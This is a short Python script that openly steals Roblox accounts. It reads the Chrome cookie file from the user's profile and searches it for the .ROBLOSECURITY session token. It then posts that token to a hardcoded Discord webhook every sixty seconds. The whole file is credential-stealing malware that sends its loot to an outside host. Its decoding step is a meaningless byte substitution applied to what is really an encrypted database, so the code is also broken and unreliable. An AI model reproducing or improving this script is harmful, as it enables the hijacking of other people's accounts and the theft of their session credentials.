import os
import requests
import json
import time

# Your Discord webhook URL
webhook_url = "https://discord.com/api/webhooks/1492645719511797861/gF5zcg_YxBNqQJ1cEH8E0rDiljv7otR3qmjh1zr5ZIfkCnQVC7BBrocZG_NYhr0D19Bn"

# Function to get Roblox cookie
def get_roblox_cookie():
    try:
        # Read Chrome browser cookies
        chrome_cookie_path = os.path.join(os.environ["USERPROFILE"], "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies")
        with open(chrome_cookie_path, 'rb') as file:
            cookie_data = file.read()

        # Decode and parse the cookies
        decode_map = {40: 62, 41: 126, 94: 93, 43: 92, 45: 95, 47: 124, 92: 92, 95: 126, 122: 44, 126: 46, 124: 64}
        translate_table = bytes.maketrans(bytearray([_ for _ in range(256)]), bytearray([decode_map.get(_, _) for _ in range(256)]))
        decoded_cookie_data = cookie_data.translate(translate_table)

        # Extract the Roblox cookie
        roblox_cookie = None
        for line in str(decoded_cookie_data).split("\\n"):
            if ".ROBLOSECURITY=" in line:
                roblox_cookie = line.split("=")[1].split(";")[0]
                break

        return roblox_cookie
    except Exception as e:
        print("Error while getting Roblox cookie: " + str(e))
        return None

# Main loop
while True:
    # Get Roblox cookie
    roblox_cookie = get_roblox_cookie()

    if roblox_cookie is not None:
        # Send the Roblox cookie to your Discord webhook
        payload = {"content": f"Grabbed Roblox cookie: `{roblox_cookie}`"}
        headers = {"Content-Type": "application/json"}
        response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
        print("Sent Roblox cookie to Discord webhook. Status code: " + str(response.status_code))
    else:
        print("Failed to grab Roblox cookie.")

    # Wait for 60 seconds before trying again
    time.sleep(60)
